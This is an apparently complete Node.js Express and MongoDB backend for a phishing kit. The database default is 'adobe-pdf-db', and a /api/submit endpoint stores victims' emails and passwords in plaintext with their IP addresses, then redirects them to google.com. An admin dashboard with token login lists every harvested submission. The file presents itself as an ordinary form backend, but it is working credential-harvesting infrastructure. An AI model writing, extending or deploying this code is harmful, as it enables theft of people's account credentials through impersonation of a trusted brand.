require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { MongoClient } = require('mongodb');
const path = require('path');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// MongoDB Connection
const MONGO_URI = process.env.MONGO_URI;
const DB_NAME = process.env.DB_NAME || 'adobe-pdf-db';
const USERS_COLLECTION = process.env.USERS_COLLECTION || 'submissions';
const ADMINS_COLLECTION = process.env.ADMINS_COLLECTION || 'admins';

let db;
let usersCollection;
let adminsCollection;

const client = new MongoClient(MONGO_URI);

// Connect to MongoDB
async function connectDB() {
  try {
    await client.connect();
    db = client.db(DB_NAME);
    usersCollection = db.collection(USERS_COLLECTION);
    adminsCollection = db.collection(ADMINS_COLLECTION);
    
    // Create index for emails
    await usersCollection.createIndex({ email: 1 });
    
    console.log('\u2705 Connected to MongoDB');
  } catch (error) {
    console.error('\u274c MongoDB Connection Error:', error);
    process.exit(1);
  }
}

// Routes

// 1. Submit form data (from your frontend)
app.post('/api/submit', async (req, res) => {
  try {
    const { email, password } = req.body;
    
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password required' });
    }
    
    // Store in MongoDB
    const result = await usersCollection.insertOne({
      email,
      password,
      submittedAt: new Date(),
      ip: req.ip || req.connection.remoteAddress
    });
    
    console.log(`\u2705 New submission: ${email}`);
    
    res.json({
      success: true,
      message: 'Submission received',
      redirectUrl: 'https://www.google.com'
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// 2. Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }
    
    // Check credentials (simple version - in production use bcrypt)
    const admin = await adminsCollection.findOne({ username });
    
    if (!admin || admin.password !== password) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Create session token (simple JWT-like token)
    const token = Buffer.from(`${username}:${Date.now()}`).toString('base64');
    
    // Store token in admin collection
    await adminsCollection.updateOne(
      { username },
      { $set: { lastLogin: new Date(), sessionToken: token } }
    );
    
    console.log(`\u2705 Admin logged in: ${username}`);
    
    res.json({
      success: true,
      token,
      message: 'Login successful'
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// 3. Get all submissions (admin only)
app.get('/api/admin/submissions', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (!token) {
      return res.status(401).json({ error: 'Unauthorized' });
    }
    
    // Verify token
    const admin = await adminsCollection.findOne({ sessionToken: token });
    
    if (!admin) {
      return res.status(401).json({ error: 'Invalid token' });
    }
    
    // Get all submissions
    const submissions = await usersCollection
      .find({})
      .sort({ submittedAt: -1 })
      .toArray();
    
    res.json({
      success: true,
      total: submissions.length,
      submissions
    });
  } catch (error) {
    console.error('Error:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// 4. Admin logout
app.post('/api/admin/logout', async (req, res) => {
  try {
    const token = req.headers.authorization?.split(' ')[1];
    
    if (token) {
      await adminsCollection.updateOne(
        { sessionToken: token },
        { $unset: { sessionToken: 1 } }
      );
    }
    
    res.json({ success: true, message: 'Logged out' });
  } catch (error) {
    res.status(500).json({ error: 'Server error' });
  }
});

// 5. Serve admin dashboard
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-dashboard.html'));
});

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'OK', message: 'Backend is running' });
});

const PORT = process.env.PORT || 5000;

connectDB().then(() => {
  app.listen(PORT, () => {
    console.log(`\ud83d\ude80 Server running on port ${PORT}`);
    console.log(`\ud83d\udcca Admin dashboard: http://localhost:${PORT}/admin`);
  });
});

process.on('SIGINT', async () => {
  console.log('\n\ud83d\uded1 Shutting down...');
  await client.close();
  process.exit(0);
});
